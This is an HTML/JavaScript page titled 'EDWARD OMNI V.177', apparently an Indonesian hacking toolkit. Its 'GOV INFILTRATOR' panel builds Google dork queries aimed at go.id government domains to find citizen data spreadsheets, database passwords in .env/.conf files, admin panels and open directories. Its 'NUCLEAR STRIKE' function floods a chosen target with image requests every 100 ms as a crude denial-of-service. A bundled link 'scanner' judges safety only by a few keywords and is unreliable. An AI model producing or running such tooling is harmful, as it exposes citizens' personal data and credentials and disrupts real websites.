<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EDWARD OMNI V.177</title>
    <style>
        :root { --neon: #00ff88; --bg: #050a0e; --red: #ff4757; --gold: #ffd700; }
        * { box-sizing: border-box; transition: 0.2s; outline: none; }
        body { background: var(--bg); color: #fff; font-family: sans-serif; margin:0; padding: 15px; }
        .master-name { text-align: center; font-size: 22px; font-weight: 800; color: var(--neon); margin-bottom: 15px; text-transform: uppercase; text-shadow: 0 0 10px var(--neon); }
        .card { background: rgba(15, 25, 35, 0.95); border: 1px solid rgba(0,255,136,0.2); border-radius: 20px; padding: 15px; margin-bottom: 12px; }
        h3 { margin: 0 0 10px 0; font-size: 10px; color: rgba(255,255,255,0.4); letter-spacing: 2px; text-transform: uppercase; border-left: 3px solid var(--neon); padding-left: 10px; }
        .input-group { background: rgba(0,0,0,0.6); border: 1px solid rgba(0,255,136,0.3); border-radius: 12px; padding: 8px; margin-bottom: 8px; }
        .label-text { font-size: 9px; color: var(--neon); display: block; margin-bottom: 3px; font-weight: bold; }
        input { background: transparent; border: none; color: #fff; width: 100%; padding: 5px; font-size: 13px; }
        .btn { width: 100%; padding: 12px; border-radius: 10px; border: none; cursor: pointer; font-weight: 800; font-size: 10px; text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 6px; }
        .btn-gov { background: var(--gold); color: #000; font-size: 9px; }
        .btn-cast { background: var(--neon); color: #000; }
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
        #customAlert { position: fixed; top: -150px; left: 50%; transform: translateX(-50%); width: 85%; background: #000; border: 2px solid var(--neon); color: #fff; padding: 15px; border-radius: 15px; font-size: 11px; font-weight: bold; text-align: center; z-index: 10001; box-shadow: 0 0 20px var(--neon); }
    </style>
</head>
<body>
    <div id="customAlert"><p id="alertMsg"></p><button onclick="closeAlert()" style="background:var(--neon); border:none; padding:5px 15px; border-radius:5px; font-weight:bold;">OKE</button></div>
    <p class="master-name">EDWARD OMNI V.177</p>

    <div class="card">
        <h3>🏛️ GOV INFILTRATOR (MANTRA TERLARANG)</h3>
        <div class="input-group"><span class="label-text">TARGET (misal: go.id):</span><input type="text" id="govTarget" value="go.id"></div>
        <div class="grid-2">
            <button class="btn btn-gov" onclick="govMantra(1)">📂 DATA WARGA</button>
            <button class="btn btn-gov" onclick="govMantra(2)">💰 ANGGARAN</button>
            <button class="btn btn-gov" onclick="govMantra(3)">🔑 DB PASSWORD</button>
            <button class="btn btn-gov" onclick="govMantra(4)">🚪 ADMIN PANEL</button>
        </div>
        <button class="btn btn-gov" style="width:100%; margin-top:5px; background:var(--red); color:#fff;" onclick="govMantra(5)">📁 DIRECTORY LISTING</button>
    </div>

    <div class="card">
        <h3>🛡️ TERMINATOR SCANNER</h3>
        <div class="input-group"><span class="label-text">SCAN LINK:</span><input type="text" id="scanInput"></div>
        <button class="btn btn-cast" onclick="deepAnalyze()">⚡ START DEEP ANALYZE</button>
    </div>

    <div class="card">
        <h3>🔥 NUCLEAR STRIKE</h3>
        <div class="input-group"><span class="label-text">TARGET:</span><input type="text" id="targetAtk"></div>
        <button class="btn" style="background:var(--red); color:#fff;" id="atkBtn" onclick="launchAtk()">LAUNCH NUCLEAR 🚀</button>
    </div>

    <script>
        let isAtk = false;
        function showAlert(m) { const a=document.getElementById('customAlert'); document.getElementById('alertMsg').innerText=m; a.style.top='20px'; }
        function closeAlert() { document.getElementById('customAlert').style.top='-150px'; }

        function govMantra(type) {
            const t = document.getElementById('govTarget').value;
            let q = "";
            if(type==1) q = `site:${t} filetype:xls OR filetype:xlsx "data penduduk"`;
            if(type==2) q = `site:${t} filetype:pdf "anggaran" OR "dana"`;
            if(type==3) q = `site:${t} filetype:env OR filetype:conf "db_password"`;
            if(type==4) q = `site:${t} inurl:admin OR inurl:login`;
            if(type==5) q = `site:${t} intitle:index.of "parent directory"`;
            window.open("https://www.google.com/search?q=" + encodeURIComponent(q), "_blank");
        }

        function deepAnalyze() {
            const u = document.getElementById('scanInput').value.toLowerCase();
            if(!u) return showAlert("KOSONG!");
            if(u.startsWith("http://") || u.includes("dana") || u.includes("kaget")) {
                showAlert("[DANGER] PHISING/UNSAFE DETECTED!");
            } else { showAlert("[SAFE] LINK CLEAN"); }
        }

        function launchAtk() {
            const t = document.getElementById('targetAtk').value;
            if(!t) return showAlert("TARGET KOSONG!");
            isAtk=true; document.getElementById('atkBtn').innerText="STOP 🛑";
            setInterval(() => { if(isAtk) new Image().src="https://"+t+"/?v="+Math.random(); }, 100);
            showAlert("ATTACKING " + t);
        }
    </script>
</body>
</html>
